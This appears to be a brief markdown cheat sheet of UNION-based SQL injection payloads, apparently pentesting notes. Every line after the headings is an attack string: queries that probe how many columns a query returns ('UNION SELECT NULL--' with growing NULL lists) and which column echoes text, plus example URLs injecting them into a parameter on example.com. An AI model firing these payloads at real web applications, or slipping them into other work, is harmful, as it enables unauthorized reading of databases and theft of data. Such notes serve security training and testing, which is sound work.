# UNION based SQL Injection

## Find number of SQL collumns
`' UNION SELECT NULL--`
`' UNION SELECT NULL,NULL--`

Example: `https://example.com/param='+UNION+SELECT+NULL,NULL--`

## Find data in collumns

`' UNION SELECT 'a',NULL,NULL,NULL--`
`' UNION SELECT NULL,'a',NULL,NULL--`
`' UNION SELECT NULL,NULL,'a',NULL--`
`' UNION SELECT NULL,NULL,NULL,'a'--`

Example: `https://example.com/param='+UNION+SELECT+'a',NULL,NULL,NULL--`
